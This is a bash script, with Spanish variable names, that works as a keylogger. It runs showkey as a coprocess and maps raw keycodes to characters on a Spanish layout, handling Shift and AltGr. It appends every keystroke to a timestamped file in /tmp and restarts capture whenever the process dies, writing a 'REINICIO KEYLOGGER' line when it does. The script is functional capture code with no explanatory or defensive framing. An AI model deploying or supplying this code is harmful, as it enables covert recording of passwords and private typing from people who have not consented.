#! /bin/bash
declare -A teclas=(
["01"]="<ESC>"
["02"]=1
["03"]=2
["04"]=3
["05"]=4
["06"]=5
["07"]=6
["08"]=7
["09"]=8
["10"]=9
["11"]=0
["12"]="<minus>"
["13"]="<equal>"
["14"]="<BackSpace>"
["15"]="<Tab>"
["16"]=qQ
["17"]=wW
["18"]=eE
["19"]=rR
["20"]=tT
["21"]=yY
["22"]=uU
["23"]=iI
["24"]=oO
["25"]=pP
["26"]="Bracketleft"
["27"]="Bracketright"
["28"]="Return(enter)"
["29"]="<Control_L>"
["30"]=aA
["31"]=sS
["32"]=dD
["33"]=fF
["34"]=gG
["35"]=hH
["36"]=jJ
["37"]=kK
["38"]=lL
["39"]=")"
["40"]="Apostrophe"
["41"]="º"
["42"]="<Shift_L>"
["43"]="Backslash(\)"
["44"]=zZ
["45"]=xX
["46"]=cC
["47"]=vV
["48"]=bB
["49"]=nN
["50"]=mM
["51"]=","
["52"]="."
["53"]="-"
["54"]="<Shift_R>"
["55"]="KP_Multiply"
["56"]="<Alt_key>"
["57"]="<Space( )>"
["58"]="<Caps_Lock>"
["59"]=F1
["60"]=F2
["61"]=F3
["62"]=F4
["63"]=F5
["64"]=F6
["65"]=F7
["66"]=F8
["67"]=F9
["68"]=F10
["69"]="<Num_Lock>"
["70"]="<Scroll_Lock>"
["71"]=KP_Home
["72"]=KP_Up
["73"]=KP_Prior
["74"]=KP_Subtract
["75"]=KP_Left
["76"]=KP_Begin
["77"]=KP_Right
["78"]=KP_Add
["79"]=KP_End
["80"]=KP_Down
["81"]=KP_Next
["82"]=KP_Insert
["83"]=KP_Delete
["86"]="less"
["87"]=F11
["88"]=F12
["100"]="<AltGraph>"
["102"]="|"
["103"]="@"
["104"]="#"
["105"]="~"
["106"]="½"
["107"]="¬"
["108"]="{"
["109"]="["
["110"]="]"
["111"]="}"
["126"]="["
["127"]="]"
["140"]="{"
["141"]="\\"
["143"]="}"
["156"]="!"
["157"]='"'
["158"]="·"
["159"]="$"
["160"]="%"
["161"]="&"
["162"]="/"
["163"]="("
["164"]=")"
["165"]="="
)



FILE=/tmp/teclas_`date +%d"-"%m"-"%Y"-"%H"."%M`
echo "================ `date +\"hora...\"%H\":\"%M\":\"%S\" , dia...\"%d\" \"%B\" \"%Y`==============================" >> $FILE

function logger(){
  coproc GO  { 
		exec /usr/bin/showkey
		 }
}



logger
while true
do
	[ -z "`ps -C showkey -o pid --no-headers`" ] && { echo -e "\nREINICIO KEYLOGGER===: `date +\"hora...\"%H\":\"%M\":\"%S\" , dia...\"%d\" \"%B\" \"%Y`===" >> $FILE;  logger; }
	while read -u "${GO[0]}" linea 2>/dev/null
	do
	 	read t estado< <(echo $linea | grep -i -e ".*\(pulsada\|liberada\)$" | awk '{print $4 " " $5}')
		case $t in 
			42|54) [ "$estado" = "pulsada" ] && SHIFT=true || SHIFT=false ;;
			58) [ "$estado" = "pulsada" ] && echo -n " <CAPS o MAYS Pulsado> " >> $FILE || echo -n " <CAPS o MAYS liberado> " >> $FILE ;;
			28) [ "$estado" = "pulsada" ] && echo -e "\n" >> $FILE ;;
			57) echo -n " " >> $FILE ;;
			100) [ "$estado" = "pulsada" ] && altgraph=true || altgraph=false ;;
			14) [ "$estado" = "pulsada" ] && echo -n -e "\033[1D" >> $FILE ;;
			[2-9]|1[01]|4[013]|2[67])
					  if [ "$estado" = "pulsada" ]
					  then
					      [ "$altgraph" = "true" ] && { echo -n "${teclas[`expr 100 + $t`]}" >> $FILE; continue; }
					      [ "$SHIFT" = "true" ] && { echo -n "${teclas[`expr 154 + $t`]}" >> $FILE; continue; }

  					      [ $t -lt 10 ] && echo -n "${teclas[0$t]}" >> $FILE || echo -n "${teclas[$t]}" >> $FILE
					  fi
					 ;;
			*) if [ "$estado" = "pulsada" ]
			   then
				case "$SHIFT" in
					"false") echo -n "${teclas[$t]:0:1}" >> $FILE ;;
					 "true") echo -n "${teclas[$t]:1:1}" >> $FILE ;;
				esac
			   fi
			   ;;
		esac
	
	done 
done


